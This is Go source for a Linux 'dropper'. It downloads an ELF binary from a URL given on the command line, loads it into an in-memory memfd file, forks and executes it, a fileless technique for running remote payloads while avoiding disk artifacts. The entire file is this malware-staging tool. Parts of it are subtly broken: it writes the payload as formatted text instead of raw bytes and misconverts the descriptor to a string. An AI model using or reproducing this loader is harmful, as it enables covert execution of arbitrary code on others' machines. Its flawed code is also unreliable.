/*
Author - P4ral1ax
*/
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"

	"golang.org/x/sys/unix"
)

// Create a MemFd pointer
func MemfdCreate(name string) int {
	fmt.Printf("Creating memfd %v", name)
	fd, err := unix.MemfdCreate(name, 0)
	if err != nil {
		fmt.Printf("MemfdCreate Error: %v", err)
		unix.Exit(0)
	}
	fmt.Printf("FD is %v", fd)
	return fd
}

// Downloads ELF from URL
func retrieveFile(url string) (response []byte) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error Retrieving File : %v", err)
		unix.Exit(0)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		print("Error Reading File : %v", err)
		unix.Exit(0)
	}
	return body
}

// Write Content
func WriteToMemfd(fd int, content []byte) {
	fmt.Printf("Writing to MemFd Pointer")
	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error Opening File: %v", err)
		unix.Exit(0)
	}
	_, err = fmt.Fprint(f, content)
	if err != nil {
		fmt.Printf("Error Writing to File: %v", err)
	}
}

func ExecMemfd(fd int) {
	pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
	if pid == 0 {
		print("Executing Memfd Pointer")
		filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
		args := [1]string{string(fd)}
		unix.Exec(filepath, args[:], os.Environ())
	}
}

func main() {
	// Define Usage string
	usage := "Usage : ./dropper {url}"
	var url string
	var elfContent []byte
	var fd int

	// Read In URL & Get File
	if len(os.Args[1:]) != 1 {
		fmt.Printf("Incorrect number of arguements\n%v", usage)
		unix.Exit(0)
	}
	url = os.Args[1]
	elfContent = retrieveFile(url)

	// Create fd and Inject Code
	fd = MemfdCreate("psovaya")
	WriteToMemfd(fd, elfContent)
	ExecMemfd(fd)
}
